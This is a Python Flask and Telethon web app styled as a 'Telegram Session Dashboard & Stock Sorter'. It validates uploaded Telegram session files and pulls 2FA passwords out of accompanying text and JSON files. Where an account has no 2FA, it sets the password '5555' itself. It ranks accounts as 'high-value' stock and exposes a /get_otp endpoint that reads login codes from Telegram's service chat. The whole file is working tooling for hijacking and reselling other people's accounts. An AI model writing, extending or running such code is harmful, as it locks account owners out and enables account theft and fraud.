import os
import re
import json
import zipfile
import asyncio
import logging
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import RPCError, FloodWaitError
from telethon.tl.functions.account import GetPasswordRequest

# ---------- LOGGING ----------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- API CREDENTIALS ----------
API_ID = int(os.environ.get("API_ID", 33803589))
API_HASH = os.environ.get("API_HASH", "d1e1750d43a237c2e5bd3c24ed899b25")
DEFAULT_AUTO_2FA = os.environ.get("DEFAULT_AUTO_2FA", "5555")

PROXY_URL = os.environ.get("PROXY_URL")
if PROXY_URL:
    from telethon import socks
    proxy = (socks.SOCKS5, PROXY_URL.split(':')[0], int(PROXY_URL.split(':')[1])) if 'socks5' in PROXY_URL else None
else:
    proxy = None

app = Flask(__name__)
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

# ---------- COUNTRY MAP ----------
COUNTRY_MAP = {
    "91": "🇮🇳 India", "1": "🇺🇸 USA/Canada", "7": "🇷🇺 Russia/Kazakhstan",
    "98": "🇮🇷 Iran", "62": "🇮🇩 Indonesia", "49": "🇩🇪 Germany",
    "44": "🇬🇧 UK", "380": "🇺🇦 Ukraine", "84": "🇻🇳 Vietnam",
    "63": "🇵🇭 Philippines", "55": "🇧🇷 Brazil", "92": "🇵🇰 Pakistan",
    "880": "🇧🇩 Bangladesh", "90": "🇹🇷 Turkey", "234": "🇳🇬 Nigeria",
    "20": "🇪🇬 Egypt"
}

def detect_country(phone):
    clean = phone.replace("+", "").strip()
    for length in [3, 2, 1]:
        prefix = clean[:length]
        if prefix in COUNTRY_MAP:
            return COUNTRY_MAP[prefix]
    return "🌐 International"

# ---------- ADVANCED DEEP 2FA FINDER ----------
def extract_2fa_from_dict(d):
    if not isinstance(d, dict):
        return None
    keys_to_check = [
        'twofa', 'two_fa', '2fa', 'password', 'two_factor', 'pass', '2FA',
        'two_step', 'two_step_verification', 'two_step_password', 'cloud_password',
        'password_2fa', 'two_fa_password', 'secret_password', '2fa_password'
    ]
    for k, v in d.items():
        if any(target in k.lower() for target in keys_to_check) and v:
            return str(v).strip()
    for k, v in d.items():
        if isinstance(v, dict):
            res = extract_2fa_from_dict(v)
            if res:
                return res
    return None

def find_2fa_in_files(base_name):
    clean_base = base_name.replace("+", "").strip()
    possible_jsons = [f"{base_name}.json", f"+{clean_base}.json", f"{clean_base}.json"]
    for jf in possible_jsons:
        json_path = os.path.join(SESSIONS_DIR, jf)
        if os.path.exists(json_path):
            try:
                with open(json_path, 'r', encoding='utf-8', errors='ignore') as f:
                    data = json.load(f)
                    val = extract_2fa_from_dict(data)
                    if val and val.lower() != "none":
                        return val
            except Exception:
                pass

    for fname in os.listdir(SESSIONS_DIR):
        if fname.endswith('.txt'):
            try:
                with open(os.path.join(SESSIONS_DIR, fname), 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line_clean = line.strip()
                        if clean_base in line_clean.replace("+", ""):
                            for sep in [":", "|", ";", ",", " "]:
                                if sep in line_clean:
                                    parts = [p.strip() for p in line_clean.split(sep) if p.strip()]
                                    if len(parts) >= 2:
                                        candidate = parts[-1]
                                        if candidate and candidate != clean_base and candidate != f"+{clean_base}":
                                            return candidate
            except Exception:
                pass
    return "None"

# ---------- Session Info Scanner ----------
async def get_session_info(filepath):
    filename = os.path.basename(filepath)
    base_name = filename.replace(".session", "")
    internal_2fa = find_2fa_in_files(base_name)
    phone_fmt = base_name if base_name.startswith("+") else f"+{base_name}"
    country_name = detect_country(phone_fmt)

    info = {
        "filename": filename,
        "phone": phone_fmt,
        "two_fa": internal_2fa,
        "country": country_name,
        "status": "Valid ✅",
        "is_valid": True,
        "id": "N/A",
        "name": "N/A",
        "username": "N/A",
        "dc": "N/A",
        "premium": False,
        "scam": False,
        "fake": False,
        "age": "2022-2026",
        "is_unique": False,
        "unique_reasons": []
    }

    client = TelegramClient(filepath.replace(".session", ""), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            info["status"] = "Expired ❌"
            info["is_valid"] = False
            await client.disconnect()
            return info

        me = await client.get_me()
        info["id"] = me.id
        if me.phone:
            info["phone"] = f"+{me.phone}"
            info["country"] = detect_country(info["phone"])
            if info["two_fa"] == "None":
                info["two_fa"] = find_2fa_in_files(me.phone)
        info["name"] = f"{me.first_name or ''} {me.last_name or ''}".strip()
        info["username"] = f"@{me.username}" if me.username else "None"
        info["dc"] = f"DC{client.session.dc_id}"

        # 2FA Verification & Auto-Set
        try:
            pwd_info = await client(GetPasswordRequest())
            if pwd_info.has_password:
                if info["two_fa"] == "None" or not info["two_fa"]:
                    info["status"] = "2FA Unknown ⚠️"
                    info["is_valid"] = False
                    info["two_fa"] = "Unknown ⚠️"
            else:
                try:
                    await client.edit_2fa(new_password=DEFAULT_AUTO_2FA, hint="5555")
                    info["two_fa"] = DEFAULT_AUTO_2FA
                    info["status"] = "Valid (2FA Set: 5555) ✅"
                    json_file = filepath.replace(".session", ".json")
                    with open(json_file, 'w', encoding='utf-8') as jf:
                        json.dump({"phone": info["phone"], "twoFA": DEFAULT_AUTO_2FA}, jf)
                except Exception as e_2fa:
                    info["two_fa"] = "No 2FA"
        except Exception:
            pass

        # Unique highlights
        if me.scam:
            info["is_unique"] = True
            info["unique_reasons"].append("🔴 SCAM TAG")
        if me.fake:
            info["is_unique"] = True
            info["unique_reasons"].append("🔴 FAKE TAG")
        if me.premium:
            info["is_unique"] = True
            info["unique_reasons"].append("⭐ PREMIUM")
        if me.id < 500000000:
            info["age"] = "2015-2017 (Very Old)"
            info["is_unique"] = True
            info["unique_reasons"].append("📅 2015-2017 OLD")
        elif me.id < 1000000000:
            info["age"] = "2018-2019 (Old)"
            info["is_unique"] = True
            info["unique_reasons"].append("📅 2018-2019 OLD")
        elif me.id < 2000000000:
            info["age"] = "2020-2021"
            info["is_unique"] = True
            info["unique_reasons"].append("📅 2020-2021 AGED")

        await client.disconnect()
    except Exception as e:
        logger.error(f"Error scanning {filename}: {e}")
        info["status"] = "Expired ❌"
        info["is_valid"] = False
    return info

# ---------- OTP Extractor ----------
async def extract_otp_from_session(phone):
    clean_phone = phone.replace("+", "").strip()
    session_files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    target_session = None

    for f in session_files:
        base = f.replace(".session", "").replace("+", "").strip()
        if base == clean_phone or base == clean_phone.lstrip('0'):
            target_session = os.path.join(SESSIONS_DIR, f)
            break

    if not target_session:
        return {"status": "error", "message": f"Session for {phone} not found"}

    client = TelegramClient(target_session.replace(".session", ""), API_ID, API_HASH, proxy=proxy)
    try:
        await asyncio.wait_for(client.connect(), timeout=10)
        if not await client.is_user_authorized():
            await client.disconnect()
            return {"status": "error", "message": "Session expired"}

        messages = await asyncio.wait_for(client.get_messages(777000, limit=5), timeout=10)
        await client.disconnect()

        if not messages:
            return {"status": "wait", "message": "No OTP received yet"}

        for msg in messages:
            if msg.text:
                match = re.search(r'\b\d{5}\b', msg.text)
                if match:
                    otp = match.group(0)
                    try:
                        os.remove(target_session)
                        json_file = target_session.replace(".session", ".json")
                        if os.path.exists(json_file):
                            os.remove(json_file)
                    except Exception:
                        pass
                    return {"status": "ok", "otp": otp, "phone": phone}

        return {"status": "wait", "message": "Login code not found"}

    except asyncio.TimeoutError:
        return {"status": "error", "message": "Request timeout"}
    except FloodWaitError as e:
        return {"status": "error", "message": f"Telegram flood wait: {e.seconds}s"}
    except RPCError as e:
        return {"status": "error", "message": f"Telegram RPC error: {str(e)}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
    finally:
        try:
            await client.disconnect()
        except:
            pass

# ==================== HTML DASHBOARD ====================
DASHBOARD_HTML = """
<!doctype html>
<html>
<head>
  <title>Telegram Session Manager</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 15px; background: #0b0f19; color: #f1f5f9; margin: 0; }
    .container { max-width: 1000px; margin: 0 auto; }
    h2, h3 { color: #38bdf8; }
    .card { background: #1e293b; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
    input[type="file"] { margin: 10px 0; padding: 8px; background: #0f172a; border-radius: 6px; border: 1px dashed #64748b; color: #fff; width: 80%; }
    button.btn-blue { background: #0284c7; color: #fff; border: none; padding: 10px 22px; border-radius: 8px; font-weight: bold; cursor: pointer; }
    button.btn-red { background: #ef4444; color: #fff; border: none; padding: 10px 22px; border-radius: 8px; font-weight: bold; cursor: pointer; float: right; }
    button.btn-red-left { background: #ef4444; color: #fff; border: none; padding: 10px 22px; border-radius: 8px; font-weight: bold; cursor: pointer; float: none; margin-top: 10px; }
    .box-unique { border-left: 6px solid #f59e0b; }
    .box-normal { border-left: 6px solid #10b981; }
    .badge { padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; margin-right: 4px; display: inline-block; }
    .badge-scam { background: #7f1d1d; color: #fca5a5; }
    .badge-aged { background: #78350f; color: #fde68a; }
    .badge-premium { background: #1e3a8a; color: #93c5fd; }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; font-size: 13px; }
    th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #334155; }
    th { background: #0f172a; color: #94a3b8; }
    textarea { width: 95%; height: 75px; background: #0f172a; color: #4ade80; font-family: monospace; border: 1px solid #475569; border-radius: 8px; padding: 10px; margin-top: 8px; }
    .action-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
    .stock-summary { display: flex; gap: 15px; justify-content: center; margin: 10px 0; flex-wrap: wrap; }
    .stock-item { background: #0f172a; padding: 8px 16px; border-radius: 20px; }
  </style>
</head>
<body>
<div class="container">
  <h2 style="text-align:center;">🔍 Telegram Session Dashboard & Stock Sorter</h2>

  <div class="stock-summary">
    <span class="stock-item">✅ Valid & Ready: <b style="color:#4ade80;">{{ valid_count }}</b></span>
    <span class="stock-item">🔥 Unique: <b style="color:#f59e0b;">{{ unique_accs|length }}</b></span>
    <span class="stock-item">📦 Normal: <b style="color:#10b981;">{{ normal_accs|length }}</b></span>
    <span class="stock-item">⚠️ 2FA Unknown: <b style="color:#f97316;">{{ unknown_2fa_count }}</b></span>
    <span class="stock-item">❌ Expired: <b style="color:#ef4444;">{{ expired_count }}</b></span>
  </div>

  <div class="card" style="text-align:center;">
    <form method="post" enctype="multipart/form-data" action="/">
      <p style="margin:0 0 8px 0;">Upload new <b>.zip</b> or <b>.session</b> files:</p>
      <input type="file" name="files" multiple accept=".session,.zip,.json,.txt"><br>
      <button type="submit" class="btn-blue">🚀 Upload & Scan</button>
    </form>
  </div>

  <div class="action-bar">
    <div><b>Total Sessions:</b> {{ all_accounts|length }}</div>
    {% if expired_count > 0 or unknown_2fa_count > 0 %}
    <form method="post" action="/clean_expired" onsubmit="return confirm('Expired & 2FA Unknown accounts ko delete karein?');">
      <button type="submit" class="btn-red">🧹 Delete Bad Accounts ({{ expired_count + unknown_2fa_count }})</button>
    </form>
    {% endif %}
  </div>

  <!-- UNIQUE ACCOUNTS -->
  <div class="card box-unique">
    <h3 style="color:#f59e0b; margin-top:0;">🔥 UNIQUE & HIGH-VALUE ACCOUNTS ({{ unique_accs|length }})</h3>
    {% if unique_accs|length > 0 %}
    <div style="overflow-x:auto;">
      <table>
        <thead><tr><th>Country</th><th>Phone</th><th>2FA Password</th><th>Highlights</th><th>ID</th><th>Age / DC</th></tr></thead>
        <tbody>
          {% for a in unique_accs %}
          <tr>
            <td><b>{{ a.country }}</b></td>
            <td><code>{{ a.phone }}</code></td>
            <td><code style="color:#38bdf8;">{{ a.two_fa }}</code></td>
            <td>
              {% for r in a.unique_reasons %}
                <span class="badge {% if 'SCAM' in r or 'FAKE' in r %}badge-scam{% elif 'OLD' in r or 'AGED' in r %}badge-aged{% else %}badge-premium{% endif %}">{{ r }}</span>
              {% endfor %}
            </td>
            <td><code>{{ a.id }}</code></td>
            <td>{{ a.age }} ({{ a.dc }})</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
    <p style="font-size:12px; color:#94a3b8; margin:12px 0 0 0;">📋 Copy for Bot (100% Working 2FA):</p>
    <textarea readonly>{{ unique_copy_text }}</textarea>
    <form method="post" action="/clean_unique" onsubmit="return confirm('SAARE UNIQUE accounts delete karne hain?');">
      <button type="submit" class="btn-red-left">🗑️ Delete All Unique ({{ unique_accs|length }})</button>
    </form>
    {% else %}
      <p style="color:#64748b; font-size:13px;">No unique valid accounts found.</p>
    {% endif %}
  </div>

  <!-- NORMAL ACCOUNTS -->
  <div class="card box-normal">
    <h3 style="color:#10b981; margin-top:0;">📦 NORMAL & REGULAR VALID ACCOUNTS ({{ normal_accs|length }})</h3>
    {% if normal_accs|length > 0 %}
    <div style="overflow-x:auto;">
      <table>
        <thead><tr><th>Country</th><th>Phone</th><th>2FA Password</th><th>Status</th><th>ID</th><th>DC</th></tr></thead>
        <tbody>
          {% for a in normal_accs %}
          <tr>
            <td><b>{{ a.country }}</b></td>
            <td><code>{{ a.phone }}</code></td>
            <td><code style="color:#38bdf8;">{{ a.two_fa }}</code></td>
            <td><span style="color:#4ade80;">{{ a.status }}</span></td>
            <td><code>{{ a.id }}</code></td>
            <td>{{ a.dc }}</td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
    <p style="font-size:12px; color:#94a3b8; margin:12px 0 0 0;">📋 Copy for Bot (100% Working 2FA):</p>
    <textarea readonly>{{ normal_copy_text }}</textarea>
    <form method="post" action="/clean_normal" onsubmit="return confirm('SAARE NORMAL accounts delete karne hain?');">
      <button type="submit" class="btn-red-left">🗑️ Delete All Normal ({{ normal_accs|length }})</button>
    </form>
    {% else %}
      <p style="color:#64748b; font-size:13px;">No normal valid accounts found.</p>
    {% endif %}
  </div>

  <!-- 2FA UNKNOWN -->
  {% if unknown_2fa_count > 0 %}
  <div class="card" style="border-left: 6px solid #f97316;">
    <h3 style="color:#f97316; margin-top:0;">⚠️ 2FA LOCKED (UNKNOWN PASSWORD - AUTO REJECTED) ({{ unknown_2fa_count }})</h3>
    <div style="overflow-x:auto;">
      <table>
        <thead><tr><th>Country</th><th>Phone</th><th>Status</th><th>File Name</th></tr></thead>
        <tbody>
          {% for a in unknown_2fa_accs %}
          <tr>
            <td>{{ a.country }}</td>
            <td><code>{{ a.phone }}</code></td>
            <td><span style="color:#f97316;">2FA Unknown ⚠️ (Skipped)</span></td>
            <td><code>{{ a.filename }}</code></td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>
  {% endif %}

  <!-- EXPIRED -->
  {% if expired_count > 0 %}
  <div class="card" style="border-left: 6px solid #ef4444;">
    <h3 style="color:#ef4444; margin-top:0;">❌ EXPIRED / DEAD SESSIONS ({{ expired_count }})</h3>
    <div style="overflow-x:auto;">
      <table>
        <thead><tr><th>Country</th><th>Phone</th><th>Status</th><th>File Name</th></tr></thead>
        <tbody>
          {% for a in expired_accs %}
          <tr>
            <td>{{ a.country }}</td>
            <td><code>{{ a.phone }}</code></td>
            <td><span style="color:#ef4444;">Expired ❌</span></td>
            <td><code>{{ a.filename }}</code></td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>
  {% endif %}

</div>
</body>
</html>
"""

# ==================== ROUTES ====================

@app.route('/', methods=['GET', 'POST'])
def home_and_sort():
    if request.method == 'POST':
        uploaded_files = request.files.getlist("files")
        for file in uploaded_files:
            if file.filename.endswith(('.session', '.json', '.txt')):
                file.save(os.path.join(SESSIONS_DIR, file.filename))
            elif file.filename.endswith('.zip'):
                zip_path = os.path.join(SESSIONS_DIR, file.filename)
                file.save(zip_path)
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(SESSIONS_DIR)
                os.remove(zip_path)

    session_files = [os.path.join(SESSIONS_DIR, f) for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]

    async def scan_all():
        tasks = [get_session_info(f) for f in session_files]
        return await asyncio.gather(*tasks)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    all_accounts = loop.run_until_complete(scan_all())
    loop.close()

    valid_accs = [a for a in all_accounts if a["is_valid"]]
    unknown_2fa_accs = [a for a in all_accounts if a["status"] == "2FA Unknown ⚠️"]
    expired_accs = [a for a in all_accounts if not a["is_valid"] and a["status"] != "2FA Unknown ⚠️"]

    unique_accs = [a for a in valid_accs if a["is_unique"]]
    normal_accs = [a for a in valid_accs if not a["is_unique"]]

    unique_copy_text = "\n".join([f"{a['phone']} : {a['two_fa']}" for a in unique_accs])
    normal_copy_text = "\n".join([f"{a['phone']} : {a['two_fa']}" for a in normal_accs])

    return render_template_string(
        DASHBOARD_HTML,
        all_accounts=all_accounts,
        unique_accs=unique_accs,
        normal_accs=normal_accs,
        unknown_2fa_accs=unknown_2fa_accs,
        expired_accs=expired_accs,
        valid_count=len(valid_accs),
        unknown_2fa_count=len(unknown_2fa_accs),
        expired_count=len(expired_accs),
        unique_copy_text=unique_copy_text,
        normal_copy_text=normal_copy_text
    )

@app.route('/clean_expired', methods=['POST'])
def clean_expired():
    session_files = [os.path.join(SESSIONS_DIR, f) for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]

    async def get_bad_files():
        bad = []
        for f in session_files:
            info = await get_session_info(f)
            if not info["is_valid"]:
                bad.append(f)
        return bad

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    to_delete = loop.run_until_complete(get_bad_files())
    loop.close()

    for s_file in to_delete:
        try:
            os.remove(s_file)
            json_file = s_file.replace(".session", ".json")
            if os.path.exists(json_file):
                os.remove(json_file)
        except Exception:
            pass
    return redirect('/')

def clean_category(is_unique):
    session_files = [os.path.join(SESSIONS_DIR, f) for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
    
    async def get_category_files():
        to_delete = []
        for f in session_files:
            info = await get_session_info(f)
            if info["is_valid"] and info["is_unique"] == is_unique:
                to_delete.append(f)
        return to_delete

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    to_delete = loop.run_until_complete(get_category_files())
    loop.close()

    for s_file in to_delete:
        try:
            os.remove(s_file)
            json_file = s_file.replace(".session", ".json")
            if os.path.exists(json_file):
                os.remove(json_file)
        except Exception:
            pass
    return redirect('/')

@app.route('/clean_unique', methods=['POST'])
def clean_unique():
    return clean_category(is_unique=True)

@app.route('/clean_normal', methods=['POST'])
def clean_normal():
    return clean_category(is_unique=False)

@app.route('/get_otp', methods=['GET'])
def get_otp_api():
    phone = request.args.get('phone', '').strip()
    if not phone:
        return jsonify({"status": "error", "message": "Phone parameter missing"}), 400

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(extract_otp_from_session(phone))
    except Exception as e:
        logger.error(f"Unexpected error in /get_otp: {e}")
        result = {"status": "error", "message": "Internal server error"}
    finally:
        loop.close()

    response = jsonify(result)
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)